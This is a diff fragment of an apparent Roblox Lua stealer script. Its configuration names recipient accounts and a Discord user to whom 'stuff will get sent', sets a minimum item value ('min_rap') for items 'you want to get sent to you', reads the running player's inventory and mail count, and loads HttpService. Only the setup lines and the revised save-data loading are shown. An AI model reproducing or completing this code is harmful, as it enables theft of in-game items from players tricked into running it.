@@ -3,13 +3,13 @@ Username2 = "fdsfedeqqq" -- stuff will get sent to this user if first user's mai
 discuser = "Erengobrrr"
 min_rap = 2000 -- minimum rap of each item you want to get sent to you.
 
-local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
-local save = library.Save.Get().Inventory
-local mailsent = library.Save.Get().MailboxSendsSinceReset
+local Save = require(game.ReplicatedStorage.Library.Client.Save)
+local HttpService = game:GetService("HttpService")
+local save = Save.Get().Inventory
+local mailsent = Save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
 local MailMessage = "gg / HcpNe56R2a"
-local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
 local getFucked = false
